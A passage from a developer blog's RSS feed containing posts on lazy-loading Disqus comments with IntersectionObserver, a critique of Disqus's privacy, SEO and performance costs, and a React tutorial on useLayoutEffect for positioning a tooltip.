&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But that &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag shouldn’t be underestimated. When it executes, &lt;a href=&quot;https://www.macarthur.me/posts/keep-using-disqus-if-you-dont-care?ref=cms.macarthur.me&quot;&gt;it loads and executes a &lt;em&gt;lot&lt;/em&gt;&lt;/a&gt; of code. And what’s particularly bad is that &lt;strong&gt;it happens even if your user doesn’t scroll down to the part of the page where any of it’s used.&lt;/strong&gt;&lt;/p&gt;&lt;h2&gt;Initialize When in View&lt;/h2&gt;&lt;p&gt;In order help users only pay that cost only when necessary, the &lt;code&gt;IntersectionObserver&lt;/code&gt; API is a great one to leverage. Using it, we can set up an “observer” and tell it to fire some code only when an “intersection” occurs between two elements. In this case, the intersection we’re concerned with is when the root HTML element where Disqus will be rendered meets the browser’s viewport. So, let’s stub some things out.&lt;/p&gt;&lt;p&gt;The first step is to set up the observer itself.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const observer = new IntersectionObserver((entries, observer) =&amp;gt; {
	entries.forEach((entry) =&amp;gt; {
		if (entry.isIntersecting) {
			console.log(&quot;Initializing Disqus!&quot;);
		}
	});
});

// Start listening:
const mountNode = document.querySelector(&quot;#disqus_thread&quot;);
observer.observe(mountNode);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When this is loaded onto a page, we wouldn’t see that log until the &lt;code&gt;#disqus_thread&lt;/code&gt; element came into the browser’s viewport. It’s worth noting that if we wanted to, we could configure this to fire when the element came &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API?ref=cms.macarthur.me#intersection_observer_options&quot;&gt;within a certain number of pixels of the viewport&lt;/a&gt;. That’s probably a good thing to consider for a production site, but for the sake of simplicity, I’m leaving things more basic here.&lt;/p&gt;&lt;p&gt;Next, we can run the code necessary for initializing Disqus on our target element. There’s nothing custom going on here. We’re literally just copying in the code Disqus gives you to embed from the beginning. It’s just that it won’t be executed until the mount element is in view.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const observer = new IntersectionObserver((entries, observer) =&amp;gt; {
	entries.forEach((entry) =&amp;gt; {
		if (entry.isIntersecting) {
			console.log(&quot;Initializing Disqus!&quot;);

			// Starting Disqus&apos;s universal embed code.
			var disqus_config = function () {
				this.page.url = PAGE_URL;
				this.page.identifier = PAGE_IDENTIFIER;
			};

			(function() {
				var d = document, s = d.createElement(&apos;script&apos;);
				s.src = &apos;https://EXAMPLE.disqus.com/embed.js&apos;;
				s.setAttribute(&apos;data-timestamp&apos;, +new Date());
				(d.head || d.body).appendChild(s);
			})();
			// Ending Disqus&apos;s universal embed code.
		}
	});
});

// Start listening:
const mountNode = document.querySelector(&quot;#disqus_thread&quot;);
observer.observe(mountNode);
&lt;/code&gt;&lt;/pre&gt;&lt;h3&gt;Important! Destroy the Observer After Triggering&lt;/h3&gt;&lt;p&gt;That gets the job mostly done, but we’re missing a critical piece. As soon as we’ve initialized Disqus, we need to destroy the observer we set up. If we don’t, Disqus will be reinitialized every time another intersection is made, which would occur anytime the user scrolls away from the mount element and back to it once again.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const observer = new IntersectionObserver((entries, observer) =&amp;gt; {
	entries.forEach((entry) =&amp;gt; {
		if (entry.isIntersecting) {
			console.log(&quot;Initializing Disqus!&quot;);

			// Starting Disqus&apos;s universal embed code.
			var disqus_config = function () {
				this.page.url = PAGE_URL;
				this.page.identifier = PAGE_IDENTIFIER;
			};

			(function() {
				var d = document, s = d.createElement(&apos;script&apos;);
				s.src = &apos;https://EXAMPLE.disqus.com/embed.js&apos;;
				s.setAttribute(&apos;data-timestamp&apos;, +new Date());
				(d.head || d.body).appendChild(s);
			})();
			// Ending Disqus&apos;s universal embed code.

+			// Stop observing to prevent reinitializing Disqus.
+			observer.unobserve(entry.target);
		}
	});
});

// Start listening:
const mountNode = document.querySelector(&quot;#disqus_thread&quot;);
observer.observe(mountNode);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And with that, we’re set. Disqus won’t download or execute any of its JavaScript until it’s necessary:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/099f8e3e-e67b-48ad-8bf5-4f75eb39765a.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;h2&gt;The Impact&lt;/h2&gt;&lt;p&gt;Initializing Disqus lazily means far fewer requests to handle and much less code to execute on page load for a good chunk of users. Here’s the number of requests a sample page was handling before lazy loading. It’s significant, especially if your users are on low-end mobile devices with limited data availability.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/4ab2c34a-6036-49c8-883f-7c75315e9c7d-10.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;After, however, things look much better (until the user scrolls to where comments are placed, of course).&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/035651ab-20ac-41c6-bdd4-e75753582ecd-10.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;h2&gt;It’s a Bandage&lt;/h2&gt;&lt;p&gt;It’s important to render that an approach like this is nothing more than a bandage on an open wound. There’s still a big cost to pay if you choose to use Disqus, albeit not monetary. It’s just that the cost will now only be realized for those who interact with your comments.&lt;/p&gt;&lt;p&gt;Without question, the best path forward is to pivot to a more performant comment service. But for the time being, consider an approach like this to minimize the impact to your users and maybe make your site a little more enjoyable to visit.&lt;/p&gt;</content:encoded></item><item><title>Keep Using Disqus if You Don’t Care About SEO, Performance, and User Privacy</title><link>https://macarthur.me/posts/keep-using-disqus-if-you-dont-care</link><guid isPermaLink="true">https://macarthur.me/posts/keep-using-disqus-if-you-dont-care</guid><pubDate>Thu, 29 Dec 2022 05:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I remember when I first started to get a little more serious about blogging. It was with a statically generated Gatsby site, with posts stored in flat Markdown files, and deployed on Netlify. I loved it. But I knew it was still missing something I wanted: a way for readers to post comments.&lt;/p&gt;&lt;p&gt;As many did, I reached for Disqus to do the job. Sheltered by naïveté, I thought it was great! But soon enough, I began to notice some of the limitations and annoyances with the platform. I became more aware of how the tool is built and operates as a business. And eventually, I regretted ever setting it up to begin with.&lt;/p&gt;&lt;p&gt;If you even slightly care about the effectiveness of your own website and the privacy of your readers’ data, you ought feel this way too. There are plenty of products out there that offer a slick setup experience and an incredible set of features for “free.” But many times (most?), there’s a decent chance some pretty serious trade-offs being made behind your back. Disqus is one of them.&lt;/p&gt;&lt;h2&gt;What Trade-Offs?&lt;/h2&gt;&lt;p&gt;There are three buckets that deserve the most attention: SEO, privacy, and performance.&lt;/p&gt;&lt;h3&gt;Privacy&lt;/h3&gt;&lt;p&gt;Disqus has long carried a questionable reputation in how it handles pretty much any information it can get its hands on, including that which is very personal. If you take a few minutes and read through &lt;a href=&quot;https://help.disqus.com/en/articles/1717103-disqus-privacy-policy?ref=cms.macarthur.me&quot;&gt;its privacy policy&lt;/a&gt;, you’ll get a better idea of why that is.&lt;/p&gt;&lt;p&gt;The list of data types they collect is long, including technical details, biological traits, personal preferences, location, and your contact information:&lt;/p&gt;&lt;blockquote&gt;i. Identity Data includes first name, last name, username or similar identifier, date of birth, email address, telephone number, and mailing address.&lt;br /&gt;ii. Technical Data includes internet protocol (IP) address, unique Cookie ID, Device ID, your login data, browser type and version, time zone setting and location, browser plug-in types and versions, operating system and platform and other technology on the devices you use to access the Service.&lt;br /&gt;iii. Profile Data includes your username and password, your interests, preferences, feedback and survey responses, marital status, gender, title.&lt;br /&gt;iv. Usage Data includes information about how you use the Service, and the content of comments that you post.&lt;br /&gt;v. Aggregated Data includes statistical or demographic data for any purpose. &lt;br /&gt;vi. Sensitive Personal We do not intentionally collect any personal data about your race or ethnicity, religious or philosophical beliefs, sex life, sexual orientation, political opinions, trade union membership, information about your health or genetic or biometric data, or information about criminal convictions and offences. However, if you make comments using the Service that include such data about yourself it will be publicly available and may be processed by Disqus or others.&lt;/blockquote&gt;&lt;p&gt;Don’t miss that list bit. If you happen to include any other details about yourself in a comment you submit, it “may be processed by Disqus or others” too. If “processed” sounds ambiguously ominous, it’s because it is. According to that policy, it at least includes selling information directly to third parties. &lt;a href=&quot;https://help.disqus.com/en/articles/1944034-third-party-advertising-partners?ref=cms.macarthur.me&quot;&gt;And there are a lot of them&lt;/a&gt; — I counted 21.&lt;/p&gt;&lt;p&gt;All of this collection starts the second you load a page with Disqus installed, even if you’re not logged in. Using Brave (which aggressively blocks third-party pixels and trackers), I pulled up a site with it installed and found seven different third-party requests blocked out of the gate. If you’re logged in, by the way, this number increases to 10.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/76462919-7cf9-4618-87ff-119b88d0094a-3.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;After discovering the extent to which their poor data stewardship goes, it wasn’t much of a surprise to see they had recently been hit for a hefty fine for &lt;a href=&quot;https://techcrunch.com/2021/05/05/disqus-facing-3m-fine-in-norway-for-tracking-users-without-consent/?ref=cms.macarthur.me&quot;&gt;tracking users without their consent&lt;/a&gt; in Europe.&lt;/p&gt;&lt;p&gt;Especially if you just need a simple comment form on your site, it’s bonkers to me that so many people permit Disqus to wrap their tentacles around &amp;amp; squeeze your data profile as much as they do.&lt;/p&gt;&lt;h3&gt;SEO&lt;/h3&gt;&lt;p&gt;The amount of SEO value that comments brings to a website is debatable, but the general consensus is that they’re beneficial it as long as they’re &lt;a href=&quot;https://www.searchenginejournal.com/google-on-the-seo-value-of-user-comments-on-websites/438870/?ref=cms.macarthur.me&quot;&gt;moderated for high-quality content.&lt;/a&gt; And if that’s true, it’s important for that content to be easy to crawl &amp;amp; index.&lt;/p&gt;&lt;p&gt;Unfortunately, Disqus makes that aim more difficult by rendering comments client-side via JavaScript. Yes, Google &lt;em&gt;is able&lt;/em&gt; to index JavaScript-rendered content. But it’s no secret that &lt;a href=&quot;https://developers.google.com/search/docs/crawling-indexing/javascript/javascript-seo-basics?ref=cms.macarthur.me&quot;&gt;indexing single-page applications is slow and inefficient&lt;/a&gt;. And some search engines don’t do it at all, meaning that even in the age of the SPA, traditional, server-rendered HTML is the most SEO-friendly way to serve the content you want crawled.&lt;/p&gt;&lt;p&gt;Just to verify comments are &lt;em&gt;for sure&lt;/em&gt; being indexed, I did a quick search for the exact phrase from a comment on my own site. &lt;a href=&quot;https://www.google.com/search?q=%22Thanks.+Super+clear+and+useful+for+some+issues+I+was+just+experiencing.%22&amp;amp;oq=%22Thanks.+Super+clear+and+useful+for+some+issues+I+was+just+experiencing.%22&amp;amp;ref=cms.macarthur.me&quot;&gt;One result came up.&lt;/a&gt; Mine.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/c918fa30-87b9-440d-8aa4-d95b1458eddb-4.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;If there’s a chance a search could pull up one of my posts by matching on a comment, you better believe I want that content to be rendered as a first-class citizen of my site, and not just a client-side-rendered afterthought.&lt;/p&gt;&lt;p&gt;By the way, there’s also one more characteristic of Disqus that can negatively impact SEO — &lt;a href=&quot;https://www.cloudflare.com/learning/performance/how-website-speed-boosts-seo/?ref=cms.macarthur.me&quot;&gt;site performance&lt;/a&gt;.&lt;/p&gt;&lt;h3&gt;Performance&lt;/h3&gt;&lt;p&gt;Disqus compromises your site’s ability to deliver a performant experience in three ways: page weight, load time, and number of requests. To explore this with some hard numbers, I spun up a basic Eleventy site and deployed it to Netlify. I wanted to play around with three different versions of a simple blog post — one with &lt;strong&gt;no comments&lt;/strong&gt;, one with &lt;strong&gt;Disqus&lt;/strong&gt;, and one with &lt;a href=&quot;https://jamcomments.com/?ref=cms.macarthur.me&quot;&gt;&lt;strong&gt;JamComments&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;,&lt;/strong&gt; a performance-minded service that integrates with a number of Jamstack platforms.&lt;/p&gt;&lt;p&gt;A blog post on the first version of this site is pretty plain. In all, it involved three HTTP requests, none of which were for JavaScript assets. Then, I took at look at the version with Disqus. This time, things started getting a little hairy, especially with respect to the amount of JavaScript that was being requested waterfall-style.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/79380d5a-9f2f-4706-b33c-620ab817ce62-2.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;That simple addition led to 12 additional network requests. A travesty, especially considering that most of those requests depended on the first being completed, so they weren’t being loaded in parallel. And that’s &lt;em&gt;just JavaScript&lt;/em&gt;. When accounting for all of the assets requested — JavaScript and otherwise — it got worse. In all, adding the Disqus snippet led to 51 total requests being fired when that simple blog post was loaded. Again, from 3 to 51.&lt;/p&gt;&lt;p&gt;Finally, I deployed a version with JamComments installed. A rendered page with it installed totaled four requests. Just looking at request count, here’s the comparison:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/336e0af6-6fc6-4fc9-984b-e7730873f012-3.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;Total Resources&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Next, let’s look at the total amount of resources that were requested from the three variants. The plain page and that with JamComments were within range of each other. Disqus, on the other hand, blew it out of the water.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/0421f6ce-a857-4e6f-97cd-fe4b91999b41-3.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;If you notice above, 1.5 megabytes of (uncompressed) JavaScript were downloaded with Disqus was installed. But when you factor in all of the other assets it downloaded after that JavaScript executed, it bumps up by another 400kb.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Request Duration&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Finally, the amount of time for everything to be downloaded &amp;amp; made ready to go. As you might expect, Disqus didn’t fare well, and JamComments’ hit to the page was marginal.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/b8c657a5-e82c-446c-a09e-7a71751028c4-2.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;h3&gt;What the Numbers Mean for Performance&lt;/h3&gt;&lt;p&gt;Those ridiculous numbers translate into some dismal performance scores, which has been shown to have &lt;a href=&quot;https://web.dev/why-speed-matters/?ref=cms.macarthur.me&quot;&gt;a measurable impact on several metrics you should care about&lt;/a&gt;, including conversion rate, SEO, and user experience.&lt;/p&gt;&lt;p&gt;I ran the three versions of my sample page through Google’s &lt;a href=&quot;https://pagespeed.web.dev/?ref=cms.macarthur.me&quot;&gt;PageSpeed Insights&lt;/a&gt; tool to see what kind of quantitive impact each has performance. The results were what you’d expect.&lt;/p&gt;&lt;p&gt;The page with no comments scored highly, receiving an overall score of 100 and green metrics across the board. No surprises here.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/d61be3ac-11dd-4af3-a035-e46ac9bd0dd7-3.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;On the page with Disqus installed, the page score dipped to 71, with some disturbing metrics. Pay particular attention to that time-to-interactive (TTI). That’s over 10 seconds of waiting before the page could reliably respond to user input.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/a49fe9fc-b0e7-40bb-930e-6ecb984db5f0-3.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;And finally, adding JamComments kept performance well-within an acceptable range. It scored  100 with everything else green.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/97892c5c-33f8-4f4d-96d4-204f3c818db7-3.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Again, all we need is a simple comment form that sends some information somewhere and renders it on the page. Disqus tries to get you to download the moon, because that’s apparently what it takes to deliver an effective experience. Or more likely, mine every ounce of information it can collect from you to send it off to third parties.&lt;/p&gt;&lt;h2&gt;Don’t Fall for the Shininess&lt;/h2&gt;&lt;p&gt;I totally get the appeal of a tool like Disqus — it offers a host of mature features, and it’s rather easy to set up on a website. But it’s important not to let those shiny tools &amp;amp; ease of use overshadow what it costs you and your readers. Even if it’s not JamComments, consider searching for a more performant, SEO-friendly, and privacy-mindful options within reach. Blog comments are still a feature worth having, so long as you don’t have to sell your soul to have them.&lt;/p&gt;</content:encoded></item><item><title>When I Actually Needed useLayoutEffect() in React</title><link>https://macarthur.me/posts/when-i-needed-uselayouteffect-in-react</link><guid isPermaLink="true">https://macarthur.me/posts/when-i-needed-uselayouteffect-in-react</guid><pubDate>Mon, 26 Dec 2022 05:00:00 GMT</pubDate><content:encoded>&lt;p&gt;If you’ve worked with React for any length of time, you’ve probably heard of the infamous &lt;code&gt;useLayoutEffect()&lt;/code&gt; hook. You’ve also probably never used it. That’s because for most cases, &lt;code&gt;useEffect()&lt;/code&gt; covers the vast majority of use cases with a much lower chance of shooting yourself in the foot. In fact, the the React docs even explicitly encourage you to use the latter whenever possible to avoid performance gotchas.&lt;/p&gt;&lt;p&gt;The reason for this is because of when each hook fires its callback. The &lt;code&gt;useEffect()&lt;/code&gt; hook fires &lt;em&gt;after&lt;/em&gt; a component renders and paints changes to the DOM; &lt;code&gt;useLayoutEffect()&lt;/code&gt; fires &lt;em&gt;before, and does so synchronously.&lt;/em&gt;&lt;/p&gt;&lt;p&gt;This means if you’re not careful, your expensive callback could block the main thread, preventing any UI updates from being rendered for the user.&lt;/p&gt;&lt;h3&gt;An Illustration&lt;/h3&gt;&lt;p&gt;Here’s a simple &lt;code&gt;Name&lt;/code&gt; component. All it does is render a piece of &lt;code&gt;name&lt;/code&gt; state with a default of “Bob.” But there’s also a &lt;code&gt;useEffect()&lt;/code&gt; hook that’ll fire whenever that state changes. And as soon as it does, it updates the name to “Alex.” If you were to render this component in the browser, you &lt;em&gt;probably&lt;/em&gt; wouldn’t notice any sort of flash. Instead, all you’d see is “Alex” painted to the screen:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const Name = () =&amp;gt; {
  const [name, setName] = useState(&apos;Bob&apos;);

  useEffect(() =&amp;gt; {
    setName(&apos;Alex&apos;);
  }, [name]);

  return &amp;lt;div&amp;gt;{name}&amp;lt;/div&amp;gt;;
};

// &amp;lt;Name /&amp;gt; seemingly _only_ paints &quot;Alex&quot; to the screen.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But technically, &lt;code&gt;useEffect()&lt;/code&gt; is firing &lt;em&gt;after&lt;/em&gt; a full render has taken place, which could also mean after that render has been painted to the screen. We can force this behavior by putting a synchronous pause in place. This &lt;code&gt;Name&lt;/code&gt; component will still behave the same way, but this time, the state update will be pushed back by a second (1000ms).&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const pause = (ms) =&amp;gt; {
  let time = new Date();

  while (new Date() - time &amp;lt;= ms) {}
};

const Name = () =&amp;gt; {
  const [name, setName] = useState(&apos;Bob&apos;);
	
	// Fires _after_ a render has taken place.
  useEffect(() =&amp;gt; {
    pause(1000);
    setName(&apos;Alex&apos;);
  }, [name]);

  return &amp;lt;div&amp;gt;{name}&amp;lt;/div&amp;gt;;
};
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you &lt;a href=&quot;https://stackblitz.com/edit/react-vafxw6?ref=cms.macarthur.me&quot;&gt;try it out this time&lt;/a&gt;, “Alex” no longer immediately paints to the screen. Instead, “Bob” is first rendered, and then, after a second, “Alex” pops in.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/7c1700ed-b4f5-4e81-a615-f5a9b151ce5e.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Based on how &lt;code&gt;useEffect()&lt;/code&gt; is documented, this checks out. It’s only firing after a full render has been committed and prepared to be painted. And so any last-second state changes or DOM modifications are at risk for being “flashed” to the screen before they’re desired.&lt;/p&gt;&lt;p&gt;Now, let’s make a small modification: instead of using &lt;code&gt;useEffect()&lt;/code&gt;, we’ll use &lt;code&gt;useLayoutEffect()&lt;/code&gt;. This time around, we’ll change the state &lt;em&gt;before&lt;/em&gt; any changes have been allowed to fully render to the DOM. And for that reason, we’ll see some far more predictable results:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const Name = () =&amp;gt; {
  const [name, setName] = useState(&apos;Bob&apos;);

	// Fires _before_ anything&apos;s been rendered at all.
  useLayoutEffect(() =&amp;gt; {
    pause(1000);
    setName(&apos;Alex&apos;);
  }, [name]);

  return &amp;lt;div&amp;gt;{name}&amp;lt;/div&amp;gt;;
};
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you were to try it out now, you’ll see that the “Bob” flash is gone. Instead, nothing renders at all until our synchronous &lt;code&gt;useLayoutEffect()&lt;/code&gt; callback has finished:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/e9a61e0d-823a-43bd-9c59-e5e4c0e34298.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;h2&gt;So, When Should I Use It?&lt;/h2&gt;&lt;p&gt;When choosing between &lt;code&gt;useEffect()&lt;/code&gt; and &lt;code&gt;useLayoutEffect()&lt;/code&gt;, use the latter when you need to something &lt;em&gt;to&lt;/em&gt; or &lt;em&gt;with&lt;/em&gt; the DOM &lt;em&gt;before&lt;/em&gt; anything has been painted to the screen.&lt;/p&gt;&lt;h3&gt;My Own Scenario&lt;/h3&gt;&lt;p&gt;I was building a simple tooltip from scratch. The component allows its positioning to be configured with a &lt;code&gt;position&lt;/code&gt; prop — either right, center, or left. However, depending on the layout of the item its mounted to, as well as the dimensions of the viewport, I &lt;em&gt;sometimes&lt;/em&gt; might want to override the provided position with an &lt;code&gt;overridePosition&lt;/code&gt;. Here’s an ultra-simplified version of this component and how it can be used.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const Tooltip = ({ children, message, position = &apos;center&apos; }) =&amp;gt; {
  const [shouldShow, setShouldShow] = useState(false);
  const toggle = () =&amp;gt; setShouldShow((val) =&amp;gt; !val);

  return (
    &amp;lt;span class=&quot;tooltip-wrapper&quot;&amp;gt;
      {shouldShow &amp;amp;&amp;amp; &amp;lt;div className={`tooltip ${position}`}&amp;gt;{message}&amp;lt;/div&amp;gt;}

      {children({ toggle })}
    &amp;lt;/span&amp;gt;
  );
};

export default function App() {
  return (
    &amp;lt;Tooltip position=&quot;left&quot; message=&quot;My message!&quot;&amp;gt;
      {({ toggle }) =&amp;gt; {
        return &amp;lt;button onClick={toggle}&amp;gt;Toggle Tooltip&amp;lt;/button&amp;gt;;
      }}
    &amp;lt;/Tooltip&amp;gt;
  );
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&quot;https://stackblitz.com/edit/react-dan16d?ref=cms.macarthur.me&quot;&gt;This works&lt;/a&gt;, but there’s a problem: &lt;strong&gt;we can predict neither the layout of the page nor the size of the user’s viewport.&lt;/strong&gt; And so, we might end up with the tooltip rendering like this — outside the view of the user:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/fbec16f9-f847-4613-abfb-a45a6de2f5b1-2.webp&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;p&gt;In cases like these, there isn’t much React can do for us. Instead, we need to take the DOM into our own hands for a bit before any rendering takes place.&lt;/p&gt;&lt;h3&gt;Reading the DOM Before Anything’s Rendered&lt;/h3&gt;&lt;p&gt;In order to get around this, we’re gonna update this component to set an &lt;code&gt;overridePosition&lt;/code&gt; only if two conditions are met:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;The tooltip’s DOM node itself is actually mounted.&lt;/li&gt;&lt;li&gt;That mounted node is hanging off the edge of the viewport.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Because all of this needs to take place before the user has a chance to see anything, it’s a great use case for &lt;code&gt;useLayoutEffect()&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;First, we’ll set up a &lt;code&gt;useLayoutEffect()&lt;/code&gt; hook that checks if a &lt;code&gt;ref.current&lt;/code&gt; value is truthy. That &lt;code&gt;ref&lt;/code&gt; will be attached to the actual tooltip markup that’s conditionally rendered (via &lt;code&gt;shouldShow&lt;/code&gt;):&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const Tooltip = ({ children, message, position = &apos;center&apos; }) =&amp;gt; {
+	const ref = useRef(null);
	const [shouldShow, setShouldShow] = useState(false);
	const toggle = () =&amp;gt; setShouldShow((val) =&amp;gt; !val);

+	useLayoutEffect(() =&amp;gt; {
+		if (!ref.current) return;
+	});

  return (
		&amp;lt;span className=&quot;tooltip-wrapper&quot;&amp;gt;
			{shouldShow &amp;amp;&amp;amp; (
				&amp;lt;div 
					className={`tooltip ${position}`}
+					ref={ref}
				&amp;gt;
					{message}
				&amp;lt;/div&amp;gt;
			)}

			{children({ toggle })}
		&amp;lt;/span&amp;gt;
	);
};
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It’s probably worth noting that we’re not passing any values to the dependency array of our hook. That’s because we &lt;em&gt;want&lt;/em&gt; the callback to run whenever any state changes. There could be countless other things going on in the browser between toggles, and so performing a fresh (yet-to-be-written) DOM check keeps us flexible with unpredictable layout changes.&lt;/p&gt;&lt;p&gt;Next up, we can check if the rendered tooltip is popping outside of the viewport. I’ll leave the implementation of that method (and other supporting methods) out of here, but if you’re interested, you can &lt;a href=&quot;https://stackblitz.com/edit/react-dan16d?ref=cms.macarthur.me&quot;&gt;check out the demo.&lt;/a&gt;&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const Tooltip = ({ children, message, position = &apos;center&apos; }) =&amp;gt; {
	const ref = useRef(null);
	const [shouldShow, setShouldShow] = useState(false);
	const toggle = () =&amp;gt; setShouldShow((val) =&amp;gt; !val);

	useLayoutEffect(() =&amp;gt; {
		if (!ref.current) return;

+		// Don&apos;t bother unless the tip is clipped by the viewport.
+		if (!elementIsOutsideViewport(ref.current)) return;
 });

  return (
    &amp;lt;span className=&quot;tooltip-wrapper&quot;&amp;gt;
      {shouldShow &amp;amp;&amp;amp; (
	      &amp;lt;div 
					className={`tooltip ${position}`}
					ref={ref}
				&amp;gt;
          {message}
        &amp;lt;/div&amp;gt;
      )}

      {children({ toggle })}
    &amp;lt;/span&amp;gt;
  );
};
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And finally, if the element &lt;em&gt;is&lt;/em&gt; being clipped by the viewport, we can run through all possible positions (”left,” “center”, and “right”) to find the one that offers the most visibility. If that override is ever set, a small piece of state will be used to update the class instead of the &lt;code&gt;position&lt;/code&gt; prop.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const Tooltip = ({ children, message, position = &apos;center&apos; }) =&amp;gt; {
	const ref = useRef(null);
	const [shouldShow, setShouldShow] = useState(false);
+	const [overridePosition, setOverridePosition] = useState(&apos;&apos;);
	const toggle = () =&amp;gt; setShouldShow((val) =&amp;gt; !val);

	useLayoutEffect(() =&amp;gt; {
		if (!ref.current) return;
		if (!elementIsOutsideViewport(ref.current)) return;

+		const position = findMostVisiblePosition(ref.current);
+		setOverridePosition(position);
	});

	return (
		&amp;lt;span className=&quot;tooltip-wrapper&quot;&amp;gt;
			{shouldShow &amp;amp;&amp;amp; (
				&amp;lt;div 
+					className={`tooltip ${overridePosition || position}`}
					ref={ref}
				&amp;gt;
					{message}
				&amp;lt;/div&amp;gt;
			)}

			{children({ toggle })}
		&amp;lt;/span&amp;gt;
	);
};
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After all of that, the tooltip should behave much better, despite being provided a position that would cause it to render outside the viewport. And thanks to &lt;code&gt;useLayoutEffect()&lt;/code&gt;, there’s zero risk of the incorrect position ever flashing to the screen.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/28c48ef5-bf80-46ce-9010-3f45d46e14a2.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot; /&gt;&lt;/figure&gt;&lt;h2&gt;What Else Am I Missing Out On?&lt;/h2&gt;&lt;p&gt;In digging into this, I came across &lt;em&gt;many&lt;/em&gt; hooks provided by React that I’ve never even heard of (ex: &lt;code&gt;useSyncExternalStore()&lt;/code&gt;???). It’s incredible the seemingly niche use cases some of them cover, and the range in different problems they help to solve.&lt;/p&gt;&lt;p&gt;So, some homework for you: &lt;a href=&quot;https://beta.reactjs.org/reference/react?ref=cms.macarthur.me&quot;&gt;skim through some of them&lt;/a&gt; the next time you’re waiting for a synchronous timeout to finish. You’ll be better off for it.&lt;/p&gt;&lt;h3&gt;Links&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://stackblitz.com/edit/react-vafxw6?ref=cms.macarthur.me&quot;&gt;useLayoutEffect() Demo&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://stackblitz.com/edit/react-dan16d?ref=cms.macarthur.me&quot;&gt;Tooltip Demo&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</content:encoded></item><item><title>Serving Notion Presigned Images with 